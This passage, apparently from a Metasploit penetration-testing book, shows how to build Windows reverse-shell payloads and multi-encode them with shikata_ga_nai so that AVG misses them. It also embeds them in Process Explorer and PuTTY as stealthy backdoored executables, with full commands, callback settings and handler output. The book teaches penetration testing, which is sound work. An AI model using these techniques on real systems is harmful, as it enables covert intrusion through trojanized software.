our payload to be a Windows reverse shell at <span class="s32">@ </span>so that it matches the behavior of the executable we created earlier, tell it the IP at <span class="s32">O </span>and the port to listen on at <span class="s32">@</span>, and we’re ready to go.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark250">Evading Antivirus Detection</a><a name="bookmark260">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">We’ll use the popular AVG Anti-Virus product in the following examples. Because it can take some time and multiple tries to circumvent certain antivirus engines, before we try to deploy a payload, we check the antivirus solution to make sure the payload gets past it before we deploy it on the target.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">In this case, when we test our payload with AVG, we see that it’s detected, as shown in Figure 7-1.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="435" height="165" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_298.gif"/></span></p><p class="s29" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 7-1: AVG detected our payload.</p><p class="s21" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark251">Encoding with MSFencode</a><a name="bookmark261">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">One of the best ways to avoid being stopped by antivirus software is to encode our payload with <span class="s19">msfencode</span>. <span class="s19">Msfencode </span>is a useful tool that alters the code in an executable so that it looks different to antivirus software but will still run the same way. Much as the binary attachment in email is encoded in Base64, <span class="s19">msfencode </span>encodes the original executable in a new binary. Then, when the executable is run, <span class="s19">msfencode </span>decodes the original code into memory and exe- cutes it.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">You can use <span class="s25">msfencode -h </span>to see a list of <span class="s19">msfencode </span>usage options. Of the <span class="s19">msfencode </span>options, the encoder formats are among the most important. For a list of encoder formats, we use <span class="s25">msfencode -l</span>, as shown next. Notice that differ- ent encoders are used for different platforms, because, for example, a Power PC (PPC) encoder will not operate correctly on an x86 platform because of differences in the two architectures.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_299.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">root@bt:/opt/framework3/msf3# <span class="s24">msfencode -l</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Framework Encoders</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">==================</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:36.26pt" cellspacing="0"><tr style="height:10pt"><td style="width:115pt"><p class="s28" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Name</p></td><td style="width:47pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Rank</p></td><td style="width:225pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Description</p></td></tr><tr style="height:11pt"><td style="width:115pt"><p class="s28" style="padding-left: 17pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:47pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:225pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">-----------</p></td></tr><tr style="height:11pt"><td style="width:115pt"><p class="s28" style="padding-left: 17pt;text-indent: 0pt;line-height: 10pt;text-align: left;">cmd/generic_sh</p></td><td style="width:47pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">good</p></td><td style="width:225pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Generic Shell Variable Substitution Command Encoder</p></td></tr><tr style="height:11pt"><td style="width:115pt"><p class="s28" style="padding-left: 17pt;text-indent: 0pt;line-height: 10pt;text-align: left;">cmd/ifs</p></td><td style="width:47pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">low</p></td><td style="width:225pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Generic ${IFS} Substitution Command Encoder</p></td></tr><tr style="height:11pt"><td style="width:115pt"><p class="s28" style="padding-left: 17pt;text-indent: 0pt;line-height: 10pt;text-align: left;">generic/none</p></td><td style="width:47pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">normal</p></td><td style="width:225pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">The &quot;none&quot; Encoder</p></td></tr><tr style="height:11pt"><td style="width:115pt"><p class="s28" style="padding-left: 17pt;text-indent: 0pt;line-height: 10pt;text-align: left;">mipsbe/longxor</p></td><td style="width:47pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">normal</p></td><td style="width:225pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">XOR Encoder</p></td></tr><tr style="height:11pt"><td style="width:115pt"><p class="s28" style="padding-left: 17pt;text-indent: 0pt;line-height: 10pt;text-align: left;">mipsle/longxor</p></td><td style="width:47pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">normal</p></td><td style="width:225pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">XOR Encoder</p></td></tr><tr style="height:11pt"><td style="width:115pt"><p class="s28" style="padding-left: 17pt;text-indent: 0pt;line-height: 10pt;text-align: left;">php/base64</p></td><td style="width:47pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">normal</p></td><td style="width:225pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">PHP Base64 encoder</p></td></tr><tr style="height:11pt"><td style="width:115pt"><p class="s28" style="padding-left: 17pt;text-indent: 0pt;line-height: 10pt;text-align: left;">ppc/longxor</p></td><td style="width:47pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">normal</p></td><td style="width:225pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">PPC LongXOR Encoder</p></td></tr><tr style="height:11pt"><td style="width:115pt"><p class="s28" style="padding-left: 17pt;text-indent: 0pt;line-height: 10pt;text-align: left;">ppc/longxor_tag</p></td><td style="width:47pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">normal</p></td><td style="width:225pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">PPC LongXOR Encoder</p></td></tr><tr style="height:11pt"><td style="width:115pt"><p class="s28" style="padding-left: 17pt;text-indent: 0pt;line-height: 10pt;text-align: left;">sparc/longxor_tag</p></td><td style="width:47pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">normal</p></td><td style="width:225pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">SPARC DWORD XOR Encoder</p></td></tr><tr style="height:11pt"><td style="width:115pt"><p class="s28" style="padding-left: 17pt;text-indent: 0pt;line-height: 10pt;text-align: left;">x64/xor</p></td><td style="width:47pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">normal</p></td><td style="width:225pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">XOR Encoder</p></td></tr><tr style="height:11pt"><td style="width:115pt"><p class="s28" style="padding-left: 17pt;text-indent: 0pt;line-height: 10pt;text-align: left;">x86/alpha_mixed</p></td><td style="width:47pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">low</p></td><td style="width:225pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Alpha2 Alphanumeric Mixedcase Encoder</p></td></tr><tr style="height:11pt"><td style="width:115pt"><p class="s28" style="padding-left: 17pt;text-indent: 0pt;line-height: 10pt;text-align: left;">x86/alpha_upper</p></td><td style="width:47pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">low</p></td><td style="width:225pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Alpha2 Alphanumeric Uppercase Encoder</p></td></tr><tr style="height:11pt"><td style="width:115pt"><p class="s28" style="padding-left: 17pt;text-indent: 0pt;line-height: 10pt;text-align: left;">x86/avoid_utf8_tolower</p></td><td style="width:47pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">manual</p></td><td style="width:225pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Avoid UTF8/tolower</p></td></tr><tr style="height:11pt"><td style="width:115pt"><p class="s28" style="padding-left: 17pt;text-indent: 0pt;line-height: 10pt;text-align: left;">x86/call4_dword_xor</p></td><td style="width:47pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">normal</p></td><td style="width:225pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Call+4 Dword XOR Encoder</p></td></tr><tr style="height:11pt"><td style="width:115pt"><p class="s28" style="padding-left: 17pt;text-indent: 0pt;line-height: 10pt;text-align: left;">x86/countdown</p></td><td style="width:47pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">normal</p></td><td style="width:225pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Single-byte XOR Countdown Encoder</p></td></tr><tr style="height:11pt"><td style="width:115pt"><p class="s28" style="padding-left: 17pt;text-indent: 0pt;line-height: 10pt;text-align: left;">x86/fnstenv_mov</p></td><td style="width:47pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">normal</p></td><td style="width:225pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Variable-length Fnstenv/mov Dword XOR Encoder</p></td></tr><tr style="height:11pt"><td style="width:115pt"><p class="s28" style="padding-left: 17pt;text-indent: 0pt;line-height: 10pt;text-align: left;">x86/jmp_call_additive</p></td><td style="width:47pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">normal</p></td><td style="width:225pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Jump/Call XOR Additive Feedback Encoder</p></td></tr><tr style="height:11pt"><td style="width:115pt"><p class="s28" style="padding-left: 17pt;text-indent: 0pt;line-height: 10pt;text-align: left;">x86/nonalpha</p></td><td style="width:47pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">low</p></td><td style="width:225pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Non-Alpha Encoder</p></td></tr><tr style="height:11pt"><td style="width:115pt"><p class="s28" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">x86/nonupper</p></td><td style="width:47pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">low</p></td><td style="width:225pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Non-Upper Encoder</p></td></tr><tr style="height:11pt"><td style="width:115pt"><p class="s43" style="padding-left: 17pt;text-indent: 0pt;line-height: 10pt;text-align: left;">x86/shikata_ga_nai</p></td><td style="width:47pt"><p class="s43" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">excellent</p></td><td style="width:225pt"><p class="s43" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Polymorphic XOR Additive Feedback Encoder</p></td></tr><tr style="height:11pt"><td style="width:115pt"><p class="s28" style="padding-left: 17pt;text-indent: 0pt;line-height: 10pt;text-align: left;">x86/single_static_bit</p></td><td style="width:47pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">manual</p></td><td style="width:225pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Single Static Bit</p></td></tr><tr style="height:11pt"><td style="width:115pt"><p class="s28" style="padding-left: 17pt;text-indent: 0pt;line-height: 10pt;text-align: left;">x86/unicode_mixed</p></td><td style="width:47pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">manual</p></td><td style="width:225pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Alpha2 Alphanumeric Unicode Mixedcase Encoder</p></td></tr><tr style="height:15pt"><td style="width:115pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 17pt;text-indent: 0pt;line-height: 10pt;text-align: left;">x86/unicode_upper</p></td><td style="width:47pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">manual</p></td><td style="width:225pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Alpha2 Alphanumeric Unicode Uppercase Encoder</p></td></tr></table><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">Now we’ll run a simple encoding of an MSF payload by importing raw output from <span class="s19">msfpayload </span>into <span class="s19">msfencode </span>to see how the result affects our anti- virus detection:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_300.png"/></span></p><p class="s24" style="padding-top: 1pt;padding-left: 53pt;text-indent: -17pt;line-height: 71%;text-align: left;"><span class="s25">root@bt:/# </span>msfpayload windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=31337 R <span class="s30">O</span>| msfencode -e x86/shikata_ga_nai <span class="s30">8 </span>-t exe <span class="s30">@ </span>&gt; /var/www/payload2.exe</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] x86/shikata_ga_nai succeeded with size 342 (iteration=1)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 14pt;text-align: left;">root@bt:/# <span class="s24">file /var/www/payload2.exe </span><span class="s30">O</span></p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">/var/www/2.exe: MS-DOS executable PE for MS Windows (GUI) Intel 80386 32-bit</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_301.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 78%;text-align: left;">We add the <span class="s25">R </span>flag at <span class="s32">O </span>to the <span class="s25">msfpayload </span>command line to specify raw output, because we will pipe its output directly into <span class="s19">msfencode</span>. We specify the <span class="s25">x86/shikata_ga_nai </span>encoder at <span class="s32">8 </span>and tell <span class="s19">msfencode </span>to send the executable out- put <span class="s25">-t exe </span><span class="s32">@ </span>to <span class="s19">/var/www/payload2.exe</span>. Finally, we run a quick check at <span class="s32">O </span>to ensure that the resulting file is in fact a Windows executable. The response</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">tells us that it is. Unfortunately, after the <span class="s19">payload2.exe </span>file is copied over to the Windows system, AVG detects our encoded payload yet again, as shown in Figure 7-2.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="434" height="167" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_302.gif"/></span></p><p class="s29" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 7-2: AVG detected our encoded payload.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark252">Multi-encoding</a><a name="bookmark262">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">When we’re performing antivirus detection without modifying the static binary itself, it’s always a cat-and-mouse game, because antivirus signatures are frequently updated to detect new and changed payloads. Within the Framework, we can get better results through <span class="s19">multi-encoding</span>, which allows the payload to be encoded several times to throw off antivirus programs that check for signatures.</p><p style="padding-left: 90pt;text-indent: 17pt;text-align: left;">In the preceding example, the <span class="s25">shikata_ga_nai </span>encoding is <span class="s19">polymorphic</span>, meaning that the payload will change each time the script is run. Of course, the payload that an antivirus product will flag is a mystery: Every time you generate a payload, the same antivirus program can flag it once and miss it another time.</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">It is recommended that you test your script using an evaluation version of a product to see if it bypasses the antivirus software prior to using it in a penetration test. Here’s an example of using multiple encoding passes:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_303.png"/></span></p><p class="s25" style="padding-top: 1pt;padding-left: 107pt;text-indent: -17pt;line-height: 83%;text-align: left;">root@bt:/opt/framework3/msf3# <span class="s24">msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=31337 R | msfencode -e x86/shikata_ga_nai -c 5 </span><span class="s30">O</span></p><p class="s24" style="padding-left: 107pt;text-indent: 0pt;line-height: 71%;text-align: left;">-t raw <span class="s30">8 </span>| msfencode -e x86/alpha_upper -c 2 <span class="s30">@ </span>-t raw | msfencode -e x86/shikata_ga_nai -c 5 <span class="s30">O </span>-t raw | msfencode -e x86/countdown -c 5 <span class="s30">@</span></p><p class="s24" style="padding-left: 107pt;text-indent: 0pt;line-height: 9pt;text-align: left;">-t exe -o /var/www/payload3.exe</p><p class="s25" style="padding-left: 107pt;text-indent: 0pt;text-align: left;">[*] x86/shikata_ga_nai succeeded with size 318 (iteration=1) [*] x86/shikata_ga_nai succeeded with size 345 (iteration=2) [*] x86/shikata_ga_nai succeeded with size 372 (iteration=3) [*] x86/shikata_ga_nai succeeded with size 399 (iteration=4) [*] x86/shikata_ga_nai succeeded with size 426 (iteration=5) [*] x86/alpha_upper succeeded with size 921 (iteration=1) [*] x86/alpha_upper succeeded with size 1911 (iteration=2) [*] x86/shikata_ga_nai succeeded with size 1940 (iteration=1) [*] x86/shikata_ga_nai succeeded with size 1969 (iteration=2) [*] x86/shikata_ga_nai succeeded with size 1998 (iteration=3) [*] x86/shikata_ga_nai succeeded with size 2027 (iteration=4) [*] x86/shikata_ga_nai succeeded with size 2056 (iteration=5) [*] x86/countdown succeeded with size 2074 (iteration=1)</p><p class="s25" style="padding-left: 107pt;text-indent: 0pt;text-align: justify;">[*] x86/countdown succeeded with size 2092 (iteration=2) [*] x86/countdown succeeded with size 2110 (iteration=3) [*] x86/countdown succeeded with size 2128 (iteration=4) [*] x86/countdown succeeded with size 2146 (iteration=5)</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">root@bt:/opt/framework3/msf3#</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_304.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 72%;text-align: left;">Here we use five counts at <span class="s32">O </span>of <span class="s25">shikata_ga_nai</span>, feeding the code in raw format at <span class="s32">8 </span>into two counts of <span class="s25">alpha_upper </span>encoding at <span class="s32">@</span>, which is then fed to another five counts of <span class="s25">shikata_ga_nai </span><span class="s32">O</span>,followed by five counts of <span class="s25">countdown </span>encoding at <span class="s32">@</span>, before finally directing the output into the desired execut- able. We are using a total of 17 encoding loops in an attempt to circumvent</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">the antivirus software. And, as you can see in Figure 7-3, we have successfully slipped our payload past the antivirus engine.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="434" height="148" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_305.gif"/></span></p><p class="s29" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 7-3: AVG has not detected the multi-encoded payload.</p><p class="s4" style="padding-top: 5pt;padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark253">Custom Executable Templates</a><a name="bookmark263">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Typically, when <span class="s25">msfencode </span>is run, the payload is embedded into the default executable template at <span class="s19">data/templates/template.exe</span>. Although this template is changed on occasion, antivirus vendors still look for it when building signa- tures. However, <span class="s19">msfencode </span>now supports the use of any Windows executable in place of the default executable template via the <span class="s25">-x </span>option. In the follow- ing example, we encode our payload again using the Process Explorer from Microsoft’s Sysinternals Suite as a custom-executable template.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_306.png"/></span></p><p class="s25" style="padding-top: 1pt;padding-left: 107pt;text-indent: -17pt;line-height: 83%;text-align: left;">root@bt:/opt/framework3/msf3# <a href="http://download.sysinternals.com/Files/" class="s40" target="_blank">wget </a><span class="s24">http://download.sysinternals.com/Files/ ProcessExplorer.zip </span><span class="s30">O</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 21pt;text-align: left;">2011-03-21 17:14:46 (119 KB/s) - &#39;ProcessExplorer.zip&#39; saved [1615732/1615732] root@bt:/opt/framework3/msf3# <span class="s24">cd work/</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">root@bt:/opt/framework3/msf3/work# <span class="s24">unzip ../ProcessExplorer.zip </span><span class="s30">8</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Archive: ../ProcessExplorer.zip</p><p class="s25" style="padding-left: 98pt;text-indent: 0pt;text-align: justify;">inflating: procexp.chm inflating: procexp.exe inflating: Eula.txt</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">root@bt:/opt/framework3/msf3/work# <span class="s24">cd ..</span></p><p class="s25" style="padding-top: 1pt;padding-left: 107pt;text-indent: -17pt;line-height: 76%;text-align: left;">root@bt:/opt/framework3/msf3# <span class="s24">msfpayload windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=8080 R | msfencode -t exe -x work/procexp.exe </span><span class="s30">@</span></p><p class="s24" style="padding-left: 107pt;text-indent: 0pt;line-height: 8pt;text-align: left;">-o /var/www/pe_backdoor.exe -e x86/shikata_ga_nai -c 5</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">[*] x86/shikata_ga_nai succeeded with size 342 (iteration=1) [*] x86/shikata_ga_nai succeeded with size 369 (iteration=2) [*] x86/shikata_ga_nai succeeded with size 396 (iteration=3) [*] x86/shikata_ga_nai succeeded with size 423 (iteration=4) [*] x86/shikata_ga_nai succeeded with size 450 (iteration=5)</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_307.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 74%;text-align: left;">As you can see, at <span class="s32">O </span>we download Process Explorer from Microsoft then unzip it at <span class="s32">8</span>. Then at <span class="s32">@ </span>we use the <span class="s25">-x </span>switch to specify the downloaded Process Explorer binary for use as our custom template. After encoding com-</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">pletes, we start up the multi-handler through <span class="s19">msfcli </span>to listen for the incoming connection, as shown here:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_308.png"/></span></p><p class="s25" style="padding-top: 1pt;padding-left: 107pt;text-indent: -17pt;line-height: 90%;text-align: left;">root@bt:/opt/framework3/msf3# <span class="s24">msfcli exploit/multi/handler PAYLOAD=windows/ shell_reverse_tcp LHOST=192.168.1.101 LPORT=8080 E</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Please wait while we load the module tree... [*] Started reverse handler on 192.168.1.101:8080 [*] Starting the payload handler...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Command shell session 1 opened (192.168.1.101:8080 -&gt; 192.168.1.195:1191)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 3pt;padding-left: 36pt;text-indent: 0pt;text-align: center;">C:\Documents and Settings\Administrator\My Documents\Downloads&gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_309.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">And voilà: We have successfully opened a shell without being detected by antivirus software.</p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="432" height="147" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_310.gif"/></span></p><p class="s29" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 7-4: The backdoored executable is not detected by AVG.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark254">Launching a Payload Stealthily</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">For the most part, when a targeted user launches a backdoored executable such as the one we just generated, nothing will appear to happen, and that can raise suspicions. To improve your chances of not tipping off a target, you can launch a payload while simultaneously continuing normal execution of the launched application, as shown here:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_311.png"/></span></p><p class="s25" style="padding-top: 1pt;padding-left: 107pt;text-indent: -17pt;line-height: 83%;text-align: left;">root@bt:/opt/framework3/msf3# <a href="http://the.earth.li/%7Esgtatham/" class="s40" target="_blank">wget </a><span class="s24">http://the.earth.li/~sgtatham/ putty/latest/x86/putty.exe </span><span class="s30">O</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">2011-03-21 17:02:48 (133 KB/s) – &#39;putty.exe&#39; saved [454656/454656]</p><p class="s24" style="padding-left: 107pt;text-indent: -17pt;line-height: 91%;text-align: left;"><span class="s25">root@bt:/opt/framework3/msf3# </span>msfpayload windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=8080 R | msfencode -t exe -x putty.exe -o /var/ www/putty_backdoor.exe -e x86/shikata_ga_nai -k <span class="s30">8 </span>-c 5</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 9pt;text-align: justify;">[*] x86/shikata_ga_nai succeeded with size 342 (iteration=1)</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">[*] x86/shikata_ga_nai succeeded with size 369 (iteration=2) [*] x86/shikata_ga_nai succeeded with size 396 (iteration=3) [*] x86/shikata_ga_nai succeeded with size 423 (iteration=4) [*] x86/shikata_ga_nai succeeded with size 450 (iteration=5)</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_312.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 74%;text-align: left;">In this listing, we download the PuTTY Windows SSH client at <span class="s32">O </span>and then access PuTTY using the <span class="s25">-k </span>flag at <span class="s32">8</span>. The <span class="s25">-k </span>flag configures the payload to launch in a separate thread from the main executable so the application</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">will behave normally while the payload is being executed. Now, as shown in Figure 7-5, when this executable is processed with AVG, it comes back clean and should execute while still presenting us with a shell! (This option may not work with all executables, so be sure to test yours before deployment.)</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">When choosing to embed a payload in an executable, you should con- sider using GUI-based applications if you’re not specifying the <span 